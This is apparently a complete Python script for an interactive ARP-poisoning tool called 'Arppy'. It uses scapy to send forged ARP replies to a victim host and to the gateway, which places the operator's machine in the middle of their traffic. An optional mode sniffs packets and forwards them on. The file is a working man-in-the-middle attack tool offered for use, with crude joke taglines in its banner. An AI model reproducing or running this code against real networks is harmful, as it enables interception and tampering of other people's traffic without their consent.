import random
import socket
import netifaces
import getmac
from scapy.all import *


def banner():
	print("\n\n")
	print('        d8888                                    ')
	print('       d88888                                    ')
	print('      d88P888                                    ')
	print('     d88P 888 888d888 88888b.  88888b.  888  888 ')
	print('    d88P  888 888P"   888 "88b 888 "88b 888  888 ')
	print('   d88P   888 888     888  888 888  888 888  888 ')
	print('  d8888888888 888     888 d88P 888 d88P Y88b 888 ')
	print(' d88P     888 888     88888P"  88888P"   "Y88888 ')
	print('                      888      888           888 ')
	print('                      888      888      Y8b d88P ')
	print('                      888      888       "Y88P"  ')


def printBanner():
	banner()
	chosenPhrase = random.randint(0,20)
	switcher = {
		0: "                    Poison your ass!",
		1: "               Poison the water supply!",
		2: "                    Poison the tea!",
		3: "                   Poison the universe!",
		4: "                   Poison the world!",
		5: "                   Poison your grandma!",
		6: "                    Poison your mom!",
		7: "                  Just poison something!",
		8: " Fuck Arpy for taking the name! Just kidding, cool project.",
		9: "             Poison someone else's grandma!",
		10: "                       Poison it!",
		11: "                Do not poison a grandma!",
		12: "                   Respect the elders!",
		13: "                     Poison it all!",
		14: "                  Do not poison animals!",
		15: "                  The cake is poisoned!",
		16: "                Dont poison your family!",
		17: "                   Poison the king!",
		18: "                  Poison the president!",
		19: "                   Poison the captain!",
		20: "              Poison the galactic emperor!"
	}
	printstring = switcher.get(chosenPhrase, lambda: "   Poison the bug that made this text appear!")
	print("\n")
	print(printstring)
	print("\n\n\n")


def printHelp():
	print("\n\n")
	print("  help: Prints this.")
	print("  banner: Prints the banner.")
	print("\n  set: Changes an option before poisoning. You can change:")
	print("       iface: The network interface to work on. default = grabs the first interface with internet access.")
	print("       dip: Destination-ip. The ip to redirect the trafic to. default = your local ip.")
	print("       sip: Source-ip. Victims ip.")
	print("       rip: Router-ip. Gateways ip. default = the gateway ip on the specified network interface.")
	print("       red: on/off. Enables package redirection.")
	print("\n  show: Shows the options current values.")
	print("\n  poison: Executes the Arp-poisoning with the chosen values.")
	print("\n  exit: Closes the program.")
	print("\n\n")

def parsear(com):
	com += " "
	acumulador = ""
	palabras = []
	onsameword = False
	for caracter in com:
		if caracter == '"': 
			onsameword = not onsameword
			continue
		if onsameword: acumulador += caracter
		elif caracter != " ": acumulador += caracter
		else:
			palabras.append(acumulador)

			acumulador = ""
	return palabras


def validIPAddress(IP):
      def isIPv4(s):
         try: return str(int(s)) == s and 0 <= int(s) <= 255
         except: return False
      def isIPv6(s):
         if len(s) > 4:
            return False
         try : return int(s, 16) >= 0 and s[0] != '-'
         except:
            return False
      if IP.count(".") == 3 and all(isIPv4(i) for i in IP.split(".")):
         return "IPv4"
      if IP.count(":") == 7 and all(isIPv6(i) for i in IP.split(":")):
         return "IPv6"
      return "ERROR"


def get_my_ip(routerip=None):
    if routerip==None:
        routerip="8.8.8.8" #default route
    ret = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((routerip,80))
        ret = s.getsockname()[0]
        s.close()
    except:
        pass
    return ret


def get_router_ip(iface=None):
	if iface == None:
		retMe = netifaces.gateways()["default"][netifaces.AF_INET][0]
	elif iface not in netifaces.interfaces():
		retMe = "ERROR"
	return retMe


def get_iface():
	retMe = netifaces.gateways()["default"][netifaces.AF_INET][1]
	return retMe


def spoofarpcache(targetip, targetmac, sourceip, sourcemac):
	spoofed = ARP(op=2 , hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
	send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
	send(packet, verbose=False)
	print("  ARP Table restored to normal for", targetip)


def poisonIt(ifn, sip, smac, dip, dmac, rip, rmac, red):
	try:
		print("\n  Sending spoofed ARP responses...")
		while True:
			spoofarpcache(sip, smac, rip, dmac)
			spoofarpcache(rip, rmac, sip, dmac)
			if red:
				try:
					packets = sniff(iface=ifn, count=0)
					sendp(packets[0], verbose=False, iface=ifn)
				except:
					pass
	except KeyboardInterrupt:
		print("\n  ARP spoofing stopped.")
		restorearp(rip, rmac, sip, smac)
		restorearp(sip, smac, rip, rmac)
		print("\n")
		return


printBanner()
linea = input(" > ")
parsed = parsear(linea)
comando = parsed[0]

attckip = None
attckmac = ""
ownmac = getmac.get_mac_address()
ownip = get_my_ip()
victip = ""
victimac = ""
routerip = None
routermac = ""
inface = None
redirect = False

while comando != "exit":
	if comando == "banner": printBanner()
	elif comando == "set":
		if len(parsed) > 2:
			if   parsed[1] == "iface" and (parsed[2] == "default" or parsed[2] == "def" or parsed[2] == "none"): inface = None
			elif parsed[1] == "iface": 
				if inface in netifaces.interfaces(): inface = parsed[2]
				else: print("\n  ERROR: I couldn't find that network interface!\n")
			elif parsed[1] == "dip" and (parsed[2] == "default" or parsed[2] == "def" or parsed[2] == "none"): attckip = None
			elif parsed[1] == "dip": 
				if validIPAddress(parsed[2]) != "ERROR": attckip = parsed[2]
				else: print("\n  ERROR: That IP is not valid!\n")
			elif parsed[1] == "sip": 
				if validIPAddress(parsed[2]) != "ERROR": victip = parsed[2]
				else: print("\n  ERROR: That IP is not valid!\n")
			elif parsed[1] == "rip" and (parsed[2] == "default" or parsed[2] == "def" or parsed[2] == "none"): routerip = None
			elif parsed[1] == "rip": 
				if validIPAddress(parsed[2]) != "ERROR": routerip = parsed[2]
				else: print("\n  ERROR: That IP is not valid!\n")
			elif parsed[1] == "red":
				if parsed[2] == "true" or parsed[2] == "on" or parsed[2] == "1": redirect = True
				elif parsed[2] == "false" or parsed[2] == "off" or parsed[2] == "0": redirect = False
				else: print("\n  ERROR: Only on/off, true/false, 1/0 are accepted here.\n")
		else: print("\n  ERROR: You need more parameters than that! Use 'help' for more info.\n")
	elif comando == "show":
		if attckip == None: 
			attckip = ownip
			attckmac = ownmac
		if routerip == None: routerip = get_router_ip()
		if routerip == "ERROR": print("\n  ERROR: There was a problem finding the router ip with the given network interface. \n")
		if inface == None: inface = get_iface()
		print("\n")
		print("     Interface:         ", inface)
		print("     Source-IP:         ", victip)
		print("     Destination-IP:    ", attckip)
		print("     Router-IP:         ", routerip)
		print("     Packet Redirection:", redirect)
		print("\n")
	elif comando == "poison":
		if victip != None:
			if routerip == None: routerip = get_router_ip()
			if inface == None: inface = get_iface()
			if attckip == None: 
				attckip = ownip
				attckmac = ownmac
			else:
				attckmac  = getmac.get_mac_address(ip = attckip, network_request=True)
			victimac  = getmac.get_mac_address(ip = victip, network_request=True)
			routermac = getmac.get_mac_address(ip = routerip, network_request=True)

			poisonIt(inface, victip, victimac, attckip, attckmac, routerip, routermac, redirect)
		else: print("\n  ERROR: sip (source ip) not defined.")
	else: printHelp()

	linea = input(" > ")
	parsed = parsear(linea)
	comando = parsed[0]








